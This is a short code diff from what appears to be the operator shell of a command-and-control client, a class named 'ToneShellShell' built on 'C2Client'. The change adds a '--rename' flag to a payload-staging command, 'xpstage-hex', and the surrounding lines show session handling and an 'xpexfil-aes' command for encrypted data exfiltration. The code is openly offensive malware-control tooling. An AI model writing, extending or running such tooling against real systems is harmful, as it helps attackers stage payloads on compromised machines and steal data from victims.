@@ -200,11 +200,11 @@ class ToneShellShell(C2Client):
                     if not self.session:
                         print("[!] not attached to a session")
                     elif len(parts) < 2:
-                        print("usage: xpstage-hex <payload_name>")
+                        print("usage: xpstage-hex <payload_name> [--rename]")
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     else:
-                        self._xp.cmd_xpstage_hex(self, parts[1])
+                        self._xp.cmd_xpstage_hex(self, parts[1], rename="--rename" in parts[2:])
 
                 elif cmd == "xpexfil-aes":
                     xp_parts = line.split()
